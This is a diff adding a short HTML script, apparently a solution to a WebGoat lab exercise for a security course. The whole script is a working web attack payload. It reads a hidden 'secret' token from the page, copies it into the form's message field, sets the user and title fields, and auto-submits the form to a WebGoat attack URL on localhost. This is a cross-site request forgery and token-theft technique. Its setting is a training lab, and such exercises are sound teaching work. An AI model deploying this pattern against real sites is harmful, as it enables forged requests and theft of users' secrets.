@@ -1,0 +1,11 @@
+<script>
+    const secretValue = document.querySelector('input[name="secret"]').value;
+
+    document.querySelector('input[name="user"]').value = 'guest';
+    document.querySelector('input[name="title"]').value = 'HelloWorld!';
+    document.querySelector('textarea[name="message"]').value = secretValue;
+    
+    const form = document.getElementById('ece568-24');
+    form.action = 'http://localhost:8030/WebGoat/attack?Screen=286137849&menu=2100';
+    form.submit()
+</script>
